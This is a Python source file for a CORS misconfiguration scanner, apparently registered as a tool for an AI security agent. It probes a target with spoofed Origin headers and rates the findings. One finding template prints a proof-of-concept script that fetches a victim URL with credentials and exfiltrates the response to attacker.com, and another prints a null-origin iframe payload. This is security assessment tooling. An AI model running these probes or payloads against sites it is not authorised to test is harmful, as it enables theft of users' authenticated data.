"""CORS misconfiguration checker for web security assessments.

Uses stdlib only (http.client, ssl, urllib.parse) — no third-party dependencies.
"""

from __future__ import annotations

import http.client
import json
import ssl
import urllib.parse
from typing import Any


def _connect(parsed: urllib.parse.ParseResult, timeout: float = 10):
    """Return an HTTPConnection or HTTPSConnection for *parsed* URL."""
    host = parsed.netloc or parsed.hostname
    if parsed.scheme == "https":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        conn = http.client.HTTPSConnection(host, context=ctx, timeout=timeout)
    else:
        conn = http.client.HTTPConnection(host, timeout=timeout)
    return conn


def _request(
    url: str,
    origin: str,
    method: str = "GET",
    extra_headers: dict[str, str] | None = None,
    timeout: float = 10,
) -> tuple[int, dict[str, str], str]:
    """Send a request with a spoofed Origin and return (status, headers, body)."""
    parsed = urllib.parse.urlparse(url)
    path = (parsed.path or "/") + (f"?{parsed.query}" if parsed.query else "")
    headers: dict[str, str] = {
        "Origin": origin,
        "Host": parsed.hostname or "",
        "User-Agent": "CAI-CORS-Checker/1.0",
        "Accept": "*/*",
        "Connection": "close",
    }
    if extra_headers:
        headers.update(extra_headers)

    conn = _connect(parsed, timeout=timeout)
    try:
        conn.request(method, path, headers=headers)
        resp = conn.getresponse()
        resp_headers = {k.lower(): v for k, v in resp.getheaders()}
        body = resp.read(4096).decode("utf-8", errors="replace")
        return resp.status, resp_headers, body
    finally:
        conn.close()


def _preflight(
    url: str,
    origin: str,
    method: str = "PUT",
    req_headers: str = "X-Custom-Header",
    timeout: float = 10,
) -> tuple[int, dict[str, str]]:
    """Send an OPTIONS preflight request and return (status, response_headers)."""
    parsed = urllib.parse.urlparse(url)
    path = (parsed.path or "/") + (f"?{parsed.query}" if parsed.query else "")
    headers = {
        "Origin": origin,
        "Host": parsed.hostname or "",
        "Access-Control-Request-Method": method,
        "Access-Control-Request-Headers": req_headers,
        "User-Agent": "CAI-CORS-Checker/1.0",
        "Connection": "close",
    }
    conn = _connect(parsed, timeout=timeout)
    try:
        conn.request("OPTIONS", path, headers=headers)
        resp = conn.getresponse()
        resp_headers = {k.lower(): v for k, v in resp.getheaders()}
        resp.read()
        return resp.status, resp_headers
    finally:
        conn.close()


def _acao(headers: dict[str, str]) -> str | None:
    """Return the Access-Control-Allow-Origin header value, or None."""
    return headers.get("access-control-allow-origin")


def _acac(headers: dict[str, str]) -> bool:
    """Return True if Access-Control-Allow-Credentials is 'true'."""
    return headers.get("access-control-allow-credentials", "").lower() == "true"


def _run_cors_check(url: str, custom_origin: str = "") -> str:
    """Check a URL for CORS misconfigurations.

    Probes multiple Origin spoofing scenarios:
    - Wildcard (*) combined with credentials
    - Reflected arbitrary origin
    - Null origin bypass
    - Subdomain trust bypass
    - Pre-credentialed ACAO header

    Args:
        url: Target URL to test (e.g. https://example.com/api/data)
        custom_origin: Optional extra origin to probe (e.g. https://evil.example.com)

    Returns:
        str: Findings with severity ratings and exploitation guidance.
    """
    if not url.strip():
        return "Error: URL is required."

    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    parsed = urllib.parse.urlparse(url)
    target_host = parsed.hostname or ""
    target_origin = f"{parsed.scheme}://{parsed.netloc}"

    findings: list[dict[str, Any]] = []
    results: list[str] = [f"\n=== CORS Misconfiguration Check: {url} ===\n"]

    # Probe origins to test
    probes: list[tuple[str, str]] = [
        ("attacker.com", "https://attacker.com"),
        ("null bypass", "null"),
        ("subdomain spoof", f"https://evil.{target_host}"),
        ("prefix spoof", f"https://{target_host}.attacker.com"),
    ]
    if custom_origin:
        probes.insert(0, ("custom origin", custom_origin))

    # ─── Step 1: Baseline — no Origin header ───────────────────────────────
    try:
        parsed_u = urllib.parse.urlparse(url)
        path = (parsed_u.path or "/") + (f"?{parsed_u.query}" if parsed_u.query else "")
        base_headers = {
            "Host": parsed_u.hostname or "",
            "User-Agent": "CAI-CORS-Checker/1.0",
            "Accept": "*/*",
            "Connection": "close",
        }
        conn = _connect(parsed_u)
        try:
            conn.request("GET", path, headers=base_headers)
            resp = conn.getresponse()
            base_resp_headers = {k.lower(): v for k, v in resp.getheaders()}
            resp.read()
        finally:
            conn.close()

        baseline_acao = _acao(base_resp_headers)
        results.append(f"Baseline (no Origin): ACAO = {baseline_acao or 'absent'}")

        if baseline_acao == "*":
            findings.append({
                "severity": "MEDIUM",
                "title": "Wildcard ACAO without Origin probe",
                "detail": (
                    "Server returns Access-Control-Allow-Origin: * for all requests regardless "
                    "of Origin. Combined with no credentials this may be acceptable, but "
                    "sensitive endpoints should restrict to specific origins."
                ),
            })
    except Exception as e:
        results.append(f"Baseline request failed: {e}")
        baseline_acao = None

    # ─── Step 2: Probe each spoofed origin ────────────────────────────────
    for label, origin in probes:
        try:
            status, resp_h, _ = _request(url, origin)
            acao = _acao(resp_h)
            acac = _acac(resp_h)

            tag = f"[{label}]"
            results.append(
                f"\n{tag} Origin: {origin!r} → ACAO: {acao!r}, Credentials: {acac}"
            )

            # CRITICAL: wildcard + credentials (browser blocks but still misconfigured)
            if acao == "*" and acac:
                findings.append({
                    "severity": "HIGH",
                    "title": f"{tag} Wildcard ACAO with credentials",
                    "detail": (
                        "Access-Control-Allow-Origin: * combined with "
                        "Access-Control-Allow-Credentials: true is invalid per spec "
                        "(browsers reject it), but indicates a misconfigured server. "
                        "Some non-browser clients will honor it."
                    ),
                })

            # CRITICAL: reflected origin + credentials
            elif acao == origin and acac and origin != "null":
                findings.append({
                    "severity": "CRITICAL",
                    "title": f"{tag} Arbitrary origin reflected + credentials allowed",
                    "detail": (
                        f"Server reflects any Origin back in ACAO and allows credentials. "
                        f"Any domain can make authenticated cross-origin requests. "
                        f"PoC: fetch('{url}', {{credentials:'include'}}) from {origin}"
                    ),
                    "exploit": (
                        f"Host on {origin}:\n"
                        f"  <script>\n"
                        f"  fetch('{url}', {{credentials:'include'}})\n"
                        f"    .then(r=>r.text()).then(d=>new Image().src='//attacker.com/?d='+btoa(d));\n"
                        f"  </script>"
                    ),
                })

            # HIGH: reflected origin without credentials (still dangerous for public APIs)
            elif acao == origin and origin not in ("null", "*") and not acac:
                findings.append({
                    "severity": "HIGH",
                    "title": f"{tag} Arbitrary origin reflected (no credentials)",
                    "detail": (
                        "Server reflects any Origin back in ACAO. Without credentials "
                        "this allows reading public responses cross-origin, which may "
                        "expose sensitive data on unauthenticated endpoints."
                    ),
                })

            # HIGH: null origin bypass + credentials
            elif origin == "null" and acao == "null" and acac:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "Null origin allowed with credentials",
                    "detail": (
                        "Server allows null origin with credentials. Sandbox iframes and "
                        "local file:// pages send a null Origin, enabling CSRF-like attacks "
                        "via sandboxed iframe:\n"
                        "  <iframe sandbox='allow-scripts allow-top-navigation-by-user-activation' "
                        "src='data:text/html,<script>fetch(...)</script>'>"
                    ),
                })

            # MEDIUM: null allowed without credentials
            elif origin == "null" and acao == "null" and not acac:
                findings.append({
                    "severity": "MEDIUM",
                    "title": "Null origin allowed (no credentials)",
                    "detail": (
                        "Server permits null origin without credentials. "
                        "Sandboxed iframes can read cross-origin responses."
                    ),
                })

            # HIGH: subdomain trust bypass
            elif "evil." in origin and acao == origin:
                sev = "CRITICAL" if acac else "HIGH"
                findings.append({
                    "severity": sev,
                    "title": f"{tag} Subdomain-spoofed origin accepted",
                    "detail": (
                        f"Server trusts {origin!r} — a fake subdomain. If an attacker "
                        f"controls a subdomain (via subdomain takeover), they can make "
                        f"{'credentialed ' if acac else ''}cross-origin requests to this API."
                    ),
                })

            # HIGH: prefix spoof accepted
            elif "attacker.com" in origin and acao == origin:
                sev = "CRITICAL" if acac else "HIGH"
                findings.append({
                    "severity": sev,
                    "title": f"{tag} Origin prefix/suffix confusion accepted",
                    "detail": (
                        f"Server trusts {origin!r} which is NOT a subdomain of {target_host!r}. "
                        "This is a prefix/suffix confusion bug in origin validation."
                    ),
                })

        except Exception as e:
            results.append(f"\n[{label}] Request failed: {e}")

    # ─── Step 3: OPTIONS preflight check ─────────────────────────────────
    try:
        pf_status, pf_headers = _preflight(url, "https://attacker.com")
        acam = pf_headers.get("access-control-allow-methods", "")
        acah = pf_headers.get("access-control-allow-headers", "")
        results.append(
            f"\nOPTIONS preflight [{pf_status}]: "
            f"Methods: {acam or 'absent'}, Headers: {acah or 'absent'}"
        )
        pf_acao = _acao(pf_headers)
        pf_acac = _acac(pf_headers)
        if pf_acao == "https://attacker.com" and pf_acac:
            findings.append({
                "severity": "CRITICAL",
                "title": "Preflight also reflects attacker origin with credentials",
                "detail": (
                    "The OPTIONS preflight mirrors the attacker's origin and allows credentials. "
                    "Browser same-origin policy is fully bypassed for credentialed requests."
                ),
            })
        if "DELETE" in acam or "PUT" in acam or "PATCH" in acam:
            findings.append({
                "severity": "MEDIUM",
                "title": f"Dangerous HTTP methods allowed in preflight: {acam}",
                "detail": (
                    "Preflight advertises write methods (DELETE/PUT/PATCH). If origin trust is "
                    "misconfigured, attackers may trigger destructive operations cross-origin."
                ),
            })
    except Exception as e:
        results.append(f"\nOPTIONS preflight failed: {e}")

    # ─── Step 4: Vary header check ────────────────────────────────────────
    try:
        _, vary_headers, _ = _request(url, target_origin)
        vary = vary_headers.get("vary", "")
        if "origin" not in vary.lower() and _acao(vary_headers):
            findings.append({
                "severity": "LOW",
                "title": "Vary: Origin header missing",
                "detail": (
                    "Server sends ACAO but no 'Vary: Origin'. Caches may serve a "
                    "permissive ACAO response to clients that should receive a stricter one."
                ),
            })
    except Exception:
        pass

    # ─── Format findings ──────────────────────────────────────────────────
    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    findings.sort(key=lambda f: sev_order.get(f["severity"], 9))

    if findings:
        results.append(f"\n{'=' * 50}")
        results.append(f"FINDINGS ({len(findings)} issue(s) detected)")
        results.append("=" * 50)
        for i, f in enumerate(findings, 1):
            results.append(f"\n[{f['severity']}] {i}. {f['title']}")
            results.append(f"   {f['detail']}")
            if "exploit" in f:
                results.append(f"\n   Exploit PoC:\n{f['exploit']}")
    else:
        results.append("\nNo CORS misconfigurations detected.")

    results.append(
        "\nNote: CORS checks are heuristic. Always verify findings "
        "manually with browser DevTools and an authenticated session."
    )

    return "\n".join(results)


# ─── SDK integration ──────────────────────────────────────────────────────────
from cai.sdk.agents import function_tool  # noqa: E402


@function_tool(strict_mode=False)
def cors_checker(url: str = "", custom_origin: str = "") -> str:
    """Check a URL for CORS (Cross-Origin Resource Sharing) misconfigurations.

    Tests multiple spoofed Origins to detect:
    - Reflected arbitrary-origin vulnerabilities (any domain can read responses)
    - Wildcard ACAO combined with credentials (spec violation indicating bad config)
    - Null-origin bypass (sandboxed iframe attacks)
    - Subdomain trust bypass (subdomain takeover amplifier)
    - Prefix/suffix confusion bugs in origin validators
    - Missing Vary: Origin header (cache poisoning risk)
    - Dangerous HTTP methods in preflight responses

    Severity levels: CRITICAL > HIGH > MEDIUM > LOW

    Args:
        url: Target URL (e.g. https://api.example.com/v1/user)
        custom_origin: Optional extra origin to probe (e.g. https://evil.example.com)

    Returns:
        str: Findings with severity, detail, and exploitation PoC where applicable.
    """
    return _run_cors_check(url, custom_origin)


# ─── Auto-register with ToolRegistry ─────────────────────────────────────────
from cai.tool_registry import TOOL_REGISTRY  # noqa: E402

TOOL_REGISTRY.register(
    "cors_checker",
    cors_checker,
    categories=["recon", "web", "exploitation"],
)
